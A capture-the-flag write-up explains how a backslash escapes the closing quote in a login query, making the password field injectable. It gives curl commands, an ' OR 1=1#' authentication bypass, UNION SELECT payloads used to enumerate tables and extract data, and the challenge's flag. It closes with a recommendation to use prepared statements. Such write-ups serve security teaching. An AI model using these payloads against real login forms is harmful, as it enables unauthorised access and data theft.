# Writeup: Admin Panel - SQL Injection via Backslash Escape

## Challenge Overview
- **Points:** 100  
- **Category:** Web / SQL Injection  
- **Target:** `http://50.116.19.213:3000/`  
- **Objective:** Bypass authentication and retrieve the flag  

---

## Vulnerability Summary
This challenge demonstrates a **Backslash Escape SQL Injection**. This occurs when an application doesn't properly sanitize backslashes, allowing a user to "escape" the closing single quote of a query string. This effectively merges two separate input fields into one injectable string.

---

## Step 1: Identifying the Injection Point
Testing with a backslash (`\`) in the username field caused a database syntax error, indicating that the backslash was being treated as an escape character.

**Payload:**
- **Username:** `admin\`
- **Password:** `test`

**Request:**
```bash
curl -X POST "[http://50.116.19.213:3000/login](http://50.116.19.213:3000/login)" \
  -d "username=admin\\&password=test" -L
```

*(Note: Double backslash `\\` is used in curl to send a single literal backslash `\`)*

### Why This Works
The backend query likely looks like this:
```sql
SELECT * FROM users WHERE username='$user' AND password='$password'
```
When we input `admin\`, the query becomes:
```sql
SELECT * FROM users WHERE username='admin\' AND password='test'
```
The `\'` tells SQL to treat the next quote as a literal character rather than the end of the string. Consequently, the string for `username` doesn't end until the **opening** quote of the password field, making the `password` field's content injectable.

---

## Step 2: Authentication Bypass
We can now use the `password` field to inject logic that makes the condition always true.

**Request:**
```bash
curl -X POST "[http://50.116.19.213:3000/login](http://50.116.19.213:3000/login)" \
  -d "username=admin\\&password= OR 1=1#" \
  -c cookies.txt
```

### The Resulting Query:
```sql
SELECT * FROM users WHERE username='admin\' AND password=' OR 1=1#'
```
* The `username` value becomes: `admin' AND password=`
* The `OR 1=1` ensures the query returns a valid record.
* The `#` comments out the final trailing quote.

---

## Step 3: Accessing Admin Panel
After logging in and saving the session to `cookies.txt`:

```bash
curl -b cookies.txt [http://50.116.19.213:3000/](http://50.116.19.213:3000/) -L
```

**Response:**
```html
<h1>Admin Panel</h1>
<p>Hello, admin Your CGPA is 2.00</p>
```

---

## Step 4: Enumerating Columns & Tables
To use a `UNION` attack, we first determine the column count and check for existing tables.

1.  **Column Count:**
    `username=\\&password= UNION SELECT 1,2#`  
    *(Confirmed 2 columns)*

2.  **Table Check:**
    `username=\\&password= UNION SELECT 1,2 FROM flag#`  
    *(Confirmed table `flag` exists)*

---

## Step 5: Extracting the Flag
Now we extract the data from the `flag` table. We assume the column name is `value` based on common CTF patterns (or after further enumeration of `information_schema.columns`).

**Final Payload:**
```bash
curl -X POST "[http://50.116.19.213:3000/login](http://50.116.19.213:3000/login)" \
  -d "username=\\&password= UNION SELECT value,1 FROM flag#" \
  -c flag_session.txt

curl -b flag_session.txt [http://50.116.19.213:3000/](http://50.116.19.213:3000/) -L
```

**Output:**
```html
<h1>Admin Panel</h1>
<p>Hello, KCTF{0c259a70a089442a7e622d02bb5d911f} Your CGPA is 1.00</p>
```

---

## Flag
> **`KCTF{0c259a70a089442a7e622d02bb5d911f}`**

---

## Key Takeaways
* **Context Matters:** A backslash isn't always just a character; in many SQL dialects (like MySQL), it's a default escape character.
* **Breaking Logic:** By escaping the closing quote of one parameter, you can hijack the entire SQL statement logic through subsequent parameters.
* **Defense:** Use **Prepared Statements** (Parameterized Queries) to prevent this, as they treat all input as data, not executable code.
